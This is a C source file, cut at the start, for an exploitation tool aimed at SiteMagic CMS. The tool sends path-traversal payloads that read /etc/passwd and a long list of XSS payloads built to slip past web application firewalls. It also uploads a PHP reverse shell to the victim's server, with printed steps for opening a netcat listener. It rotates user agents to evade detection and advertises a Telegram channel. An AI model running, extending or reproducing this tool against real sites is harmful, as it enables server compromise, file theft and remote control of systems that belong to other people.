        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.13.US Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MAAU; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSMSE; rv:11.0) like Gecko",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)",
        "Mozilla/5.0 (Linux; Android 4.4.2; SM-T320 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H143 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/7.0.55539 Mobile/11D257 Safari/9537.53",
        "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F69",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
        "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
        "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
        "Mozilla/5.0 (Linux; Android 4.4.2; SM-P600 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0",
        "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
        "Mozilla/5.0 (X11; CrOS x86_64 6812.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.153 Safari/537.36",
        "Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0"
    };


    static int current = 0; 
    static int numAgents = sizeof(agents) / sizeof(agents[0]);

    const char *ua_to_send = agents[current];
    current = (current + 1) % numAgents;

    
    curl_easy_setopt(curl,
        CURLOPT_USERAGENT,
        ua_to_send);

}

/* 
* Exploit LFI 
* Local File Inclusion Exploitation Function
*/
void exploitLfi(const char *urlInput)
{
    CURL *curl = curl_easy_init(); 
    if (!curl)
    {
        fprintf(stderr, "\e[0;31m[-] Error initializing CURL\n");
        log_file("\e[0;31m[-] Error initializing CURL, Please Check your Connection !!\n"); 
        exit(1);
    }
    
    //You can add other techniques as you want, of course, add them here only without modifying the tool logic.
    //Once you add a technique to bypass Waf, it will be activated in the attack.
    char *payloads[] = {
        "../../../../../../../../../../etc/passwd%00.png",
        "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500.png", 
        "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%252500.png", 
        "..//..//..//..//..//..//..//..//..//..//etc//passwd%00.png",
        "../\\../\\../\\../\\../\\../\\../\\../\\../\\../\\etc/passwd%00.png",
        "././././././././././etc/passwd%00.png",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00.png",
        "..%2f..%2f..%2f..%2f%%65%%74%%63%2f%%70%%61%%73%%73%%77%64",
        "..%252f..%252f..%252f..%252f%%65%%74%63%2f%70%61%%73%%73%%77%64"

    };

    int numberPayloads = sizeof(payloads) / sizeof(payloads[0]);


    for (int p = 0; p < numberPayloads ; p++)
    {
        Mem chunk = { .buffer = NULL, .len = 0 };
        char *param = payloads[p];
        char full[2500];
        snprintf(full,
            sizeof(full),
            "%s/smcmsdemoint/index.php?SMTpl=%s", 
            urlInput,
            param);  
        
        curl_easy_setopt(curl,
            CURLOPT_URL,
            full);
        sleep(0.5);
        curl_easy_setopt(curl,
            CURLOPT_FOLLOWLOCATION,
            1L);
        sleep(1);
        CURLcode code = curl_easy_perform(curl); 
        sleep(1);
        long httpCode = 0;
        printf("\e[0;37m-----------------------------------------------------------------------------------------------------------------------------\n");
        printf("\e[0;32m[+] Test Target URL : %s\n", full); 

        if (code == CURLE_OK)
        {
            fprintf(stdout, "\e[0;36m[+] Request sent successfully !!\n");
            log_file("\e[0;36m[+] Request sent successfully !!\n");

            curl_easy_getinfo(curl,
                CURLINFO_RESPONSE_CODE,
                &httpCode); 
            printf("\e[0;36m=> HTTP response code: %ld\n",
                httpCode);
            if (chunk.buffer && strstr(chunk.buffer, "root:x:0:0") != NULL)
            {
                printf("[!] Possible LFI success detected in response!\n");
                log_file("[!] Possible LFI success detected in response!\n");
            }
        }
        else 
        {
            fprintf(stderr, "\e[0;31m[-] The request was not sent to the desired target. Please make sure you are connected !!\n");
            log_file("\e[0;31m[-] The request was not sent to the desired target. Please make sure you are connected !!\n") ;
            curl_easy_cleanup(curl);
            exit(1); 
        }
        
    }
    curl_easy_cleanup(curl); 

}

/* 
* Exploit XSS
* XSS exploit function
*/
void exploitXss(const char *baseUrl) 
{
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr,
            "\e[0;31m[-] Error initializing CURL\n");
        log_file("\e[0;31m[-] Error initializing CURL\n");
        return;
    }
    //Yes, as usual, you can include as many as you want here and it will be injected directly into the request when attack.
    const char *payloads[] = {
        "<script>alert(document.cookie);</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "';alert(1);//",
        "\"><img src=x onerror=alert(document.domain)>",
        "<body onload=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<link rel=stylesheet href=data:text/css,*{animation-name:alert(1)}>",
        "<style>@keyframes x{}</style><div style='animation-name:x' onanimationstart=alert(1)></div>",
        "<input autofocus onfocus=alert('XSS')>",
        "<video><source onerror=\"javascript:alert(1)\"></video>",
        "<iframe src=javascript:alert(1)>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<script>/*--><!]]>*/alert(1)//<!</script>",
        "<svg><desc><![CDATA[><script>alert(1)</script>]]></desc></svg>",
        "<math><mi//xlink:href=\"data:x,alert(1)\"></math>",
        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<object type='text/html' data='data:text/html,<script>alert(1)</script>'></object>",
        "<form><button formaction='javascript:alert(1)'>ClickMe</button></form>",
        "<img src=x onerror=confirm(1)>",
        "<audio src onerror=prompt(1)>",
        "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>",
        "`'><script>\xE2\x80\x84javascript:alert(1)</script>",
        "`'><script>\xE3\x80\x80javascript:alert(1)</script>",
        "`'><script>\x09javascript:alert(1)</script>",
        "`'><script>\xE2\x80\x89javascript:alert(1)</script>",
        "`'><script>\xE2\x80\x85javascript:alert(1)</script>",
        "`'><script>\xE2\x80\x88javascript:alert(1)</script>",
        "`'><script>\x00javascript:alert(1)</script>",
        "`'><script>\xE2\x80\xA8javascript:alert(1)</script>",
        "`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>",
        "`'><script>\xE1\x9A\x80javascript:alert(1)</script>",
        "<a href=\"\\x18javascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\x11javascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\x17javascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\x03javascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\x0Ejavascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\x1Ajavascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\x00javascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\x10javascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\x20javascript:javascript:alert(1)\">test</a>",
        "<a href=\"\\x13javascript:javascript:alert(1)\">test</a>",
        "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>",
        "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>",
        "<svg onResize onResize=\"javascript:javascript:alert(1)\"></svg>",
        "<title onPropertyChange onPropertyChange=\"javascript:javascript:alert(1)\"></title>",
        "<iframe onLoad onLoad=\"javascript:javascript:alert(1)\"></iframe>",
        "<body onMouseEnter onMouseEnter=\"javascript:javascript:alert(1)\"></body>",
        "<body onFocus onFocus=\"javascript:javascript:alert(1)\"></body>",
        "<frameset onScroll onScroll=\"javascript:javascript:alert(1)\"></frameset>",
        "<script onReadyStateChange onReadyStateChange=\"javascript:javascript:alert(1)\"></script>",
        "<html onMouseUp onMouseUp=\"javascript:javascript:alert(1)\"></html>",
        "<body onPropertyChange onPropertyChange=\"javascript:javascript:alert(1)\"></body>",
        "<svg onLoad onLoad=\"javascript:javascript:alert(1)\"></svg>",
        "<body onPageHide onPageHide=\"javascript:javascript:alert(1)\"></body>",
        "<body onMouseOver onMouseOver=\"javascript:javascript:alert(1)\"></body>",
        "<body onUnload onUnload=\"javascript:javascript:alert(1)\"></body>",
        "<body onLoad onLoad=\"javascript:javascript:alert(1)\"></body>",
        "<bgsound onPropertyChange onPropertyChange=\"javascript:javascript:alert(1)\"></bgsound>",
        "<html onMouseLeave onMouseLeave=\"javascript:javascript:alert(1)\"></html>",
        "<html onMouseWheel onMouseWheel=\"javascript:javascript:alert(1)\"></html>",
        "<style onLoad onLoad=\"javascript:javascript:alert(1)\"></style>",
        "<iframe onReadyStateChange onReadyStateChange=\"javascript:javascript:alert(1)\"></iframe>",
        "<body onPageShow onPageShow=\"javascript:javascript:alert(1)\"></body>",
        "<style onReadyStateChange onReadyStateChange=\"javascript:javascript:alert(1)\"></style>",
        "<frameset onFocus onFocus=\"javascript:javascript:alert(1)\"></frameset>",
        "<applet onError onError=\"javascript:javascript:alert(1)\"></applet>",
        "<marquee onStart onStart=\"javascript:javascript:alert(1)\"></marquee>",
        "&#00;",
        "<form><input type=\"date\" onfocus=\"alert(1)\"></form>",
        "<form><textarea onkeyup='alert(1)'></textarea></form>",
        "<script>confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')</script>"
    };
    int np = sizeof(payloads) / sizeof(payloads[0]);

    for (int p = 0; p < np; p++) {
        char *enc = curl_easy_escape(curl,
            payloads[p],
            0);
        if (!enc) continue;

        Mem chunk = { .buffer = NULL, .len = 0 };
        char full_url[2048];
        snprintf(full_url,
            sizeof(full_url),
            "%s%s",
            baseUrl,
            enc);
        printf("\e[0;36m[+] Testing: %s\n",
            full_url);

        curl_easy_setopt(curl,
            CURLOPT_URL,
            full_url);
        sendAgents(curl);
        curl_easy_setopt(curl,
            CURLOPT_FOLLOWLOCATION,
            1L);
        
        curl_easy_setopt(curl,
            CURLOPT_WRITEFUNCTION,
            write_cb);
        curl_easy_setopt(curl,
            CURLOPT_WRITEDATA,
            &chunk);

        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            if (strstr(chunk.buffer, payloads[p])) 
            {
                printf("\e[0;36m[+] Possible XSS with payload: %s\n",
                    payloads[p]);
                log_file("\e[0;36m[+] Possible XSS\n");
            } else 
            {
            	
                printf("\e[0;31m[-] No reflection for payload: %s\n",
                    payloads[p]);
                log_file("\e[0;31m[-] No reflection");
            }
        } else 
        {
            fprintf(stderr,
                "\e[0;31m[-] curl error: %s\n",
                curl_easy_strerror(res));
            log_file("[-] Error CURL , Please Check your Connection !! \n");
        }

        curl_free(enc);
        free(chunk.buffer);
    }

    curl_easy_cleanup(curl);
}

//File upload vulnerability function
void fileUploid(const char *urlInput) 
{

    CURL *curl = curl_easy_init();
    if (!curl) 
    {
        fprintf(stderr,
            "\e[1;31m[-] Error initializing CURL\n");
        exit(1);
    }

    CURLcode res;
    curl_mime *form = curl_mime_init(curl);
    curl_mimepart *field;

    char fullUrl[3000];
    snprintf(fullUrl, sizeof(fullUrl),
        "%s/sitemagic/index.php?SMExt=SMFiles&SMTemplateType=Basic&SMExecMode=Dedicated&SMFilesUpload&SMFilesUploadPath=files%%2Fimages",
        urlInput);

    field = curl_mime_addpart(form);
    curl_mime_name(field,
        "SMInputSMFilesUpload");
    curl_mime_filedata(field,
        "php-reverse-shell.php");

    field = curl_mime_addpart(form);
    curl_mime_name(field,
        "SMPostBackControl");
    curl_mime_data(field,
        "",
        CURL_ZERO_TERMINATED);

    field = curl_mime_addpart(form);
    curl_mime_name(field,
        "SMRequestToken");
    curl_mime_data(field,
        "f9f116f33c012ce5e67f52dffc7e6bc6",
        CURL_ZERO_TERMINATED);

    curl_easy_setopt(curl,
        CURLOPT_URL,
        fullUrl);
    curl_easy_setopt(curl,
        CURLOPT_MIMEPOST,
        form);

    res = curl_easy_perform(curl);
    if (res == CURLE_OK) 
    {
        printf("\e[1;32m[+] Full Target Url : %s\n", fullUrl );
        fprintf(stdout, "\e[1;36m[+] Request sent successfully!\n");
        long httpCode = 0;
        curl_easy_getinfo(curl,
            CURLINFO_RESPONSE_CODE,
            &httpCode);
        printf("\e[1;36m[+] HTTP response code: %ld\n",
            httpCode);
    } 
    else 
    {
        fprintf(stderr, "\e[1;31m[-] Failed to send request: %s\n",
            curl_easy_strerror(res));
        curl_easy_cleanup(curl);
        exit(1);
    }

    curl_easy_cleanup(curl);
    curl_mime_free(form);
}

int main(int argc,
    const char **argv) 
{
	printf(
        "\e[0;31m"
        "  __  __       _     __   __  \n"
        " |  \\/  |     (_)    \\ \\ / /  \n"
        " | \\  / | __ _ _  ___ \\ V /   \n"
        " | |\\/| |/ _` | |/ __| > <    \n"
        " | |  | | (_| | | (__ / . \\    \n"
        " |_|  |_|\\__, |_|\\___/_/ \\_\\   \n"
        "          __/ |               \n"
        "         |___/  \e[1;37m @Byte Reaper         \n"

	);
	printf("\n\e[1;35m[+] Welcome to Mgicx SiteMagic Exploitation Tool.\n");
    printf("\n\e[0;33m[+] This tool exploits three vulnerabilities: XSS, LFI, and file upload.\n");
    log_file("\n\e[0;33m[+] Welcome to the mgicX tool for exploiting SiteMagic CMs. I hope you have a pleasant experience.\n");
    printf("\e[0;33m==> I hope you have a pleasant experience !!\n");
    log_file("\e[0;33m==> I hope you have a pleasant experience !!\n");
    printf("\n\e[1;30m===>>> Welcome to my Telegram channel : t.me/exploiterX0\n");
    log_file("\n\e[1;30m===>>> Welcome to my Telegram channel : t.me/exploiterX0\n");
	
	printf("\e[0;37m\n-----------------------------------------------------------------------------------------------------------------------------\n");
    log_file("\e[0;37m\n-----------------------------------------------------------------------------------------------------------------------------\n");
    printf("[+] Log file Create Exploit (Mgicx.log) !!\n");
    curl_global_init(CURL_GLOBAL_ALL);

    const char *url   = NULL;

    int xss = 0;
    int lfi = 0;  
    int file_upload = 0;
    struct argparse_option options[] = {

        OPT_HELP(),

        OPT_STRING('u',
            "url",
            &url,
            "Enter Target Url (SiteMagic CMS)"),

        OPT_BOOLEAN('x',
            "xss",
            &xss,
            "Xss Exploit (Ex : http://www.example.com/index.php?SMExt=)"),
        OPT_BOOLEAN('f',
            "lfi",
            &lfi,
            "LFI Exploit (Ex : http://www.example.com)"),
        OPT_BOOLEAN('p',
            "upload",
            &file_upload,
            "File Upload (Reverse shell PHP) (Ex : http://www.example.com)"),

        OPT_END(),

    };


    struct argparse argparse;

    argparse_init(&argparse,
        options,
        NULL,
        0);

    argparse_parse(&argparse,
        argc,
        argv);
    if (!url) 
    {
    fprintf(stderr, 
        "\e[0;33m[-] Usage: %s -u <url> -x <xss> OR -f <lfi>\n",
        argv[0]);
    log_file("\e[0;33m[-] Usage: %s -u <url> -x <xss> OR -f <lfi>\n");
    return EXIT_FAILURE;
    }


    if (!xss && !lfi && !file_upload) 
    {
    fprintf(stderr, "\e[0;31m[-] Error: Please specify an exploit (-x,--xss) Or (-f,--lfi) Or (-p, --upload)\n");
    log_file("\e[0;31m[-] Error: Please specify an exploit (-x,--xss) Or (-f,--lfi) Or (-p, --upload)\n");
    return EXIT_FAILURE;
    }

    if (xss) 
    {
    printf("\e[0;34m[+] Exploit XSS Start (URL = %s)\n",
        url);
    exploitXss(url);
    }

    if (lfi) {
    printf("\e[0;34m[+] Exploit LFI Start (URL = %s)\n",
        url);
    exploitLfi(url);
    }
    if (file_upload)
    {
        printf("\e[1;36m[+] Please Create File (name : php-reverse-shell.php)\n");
        printf("\e[1;36m[+] And write in it Php reverse shell command (command on kali : locate php-reverse-shell.php)\n");
        printf("\e[1;36m[+] Place it in the same location where the tool is running to upload it to the victim's server\n");
        printf("\e[1;36m[+] Finally, don't forget to use the port you included in the reverse connection (exemple : nc -lvnp 1234)\n");
        printf("\e[1;33m[+] Exploit File Upload Start... (URL = %s)\n",
            url);
        fileUploid(url);
    }

    
    printf("\e[0;37m\n-----------------------------------------------------------------------------------------------------------------------------\n");
    log_file("\e[0;37m\n-----------------------------------------------------------------------------------------------------------------------------\n");
    printf("\e[1;35m[+] goodbye !!\n"); 
    log_file("\e[1;35m[+] goodbye !!\n");
    curl_global_cleanup();
    return 0;
}
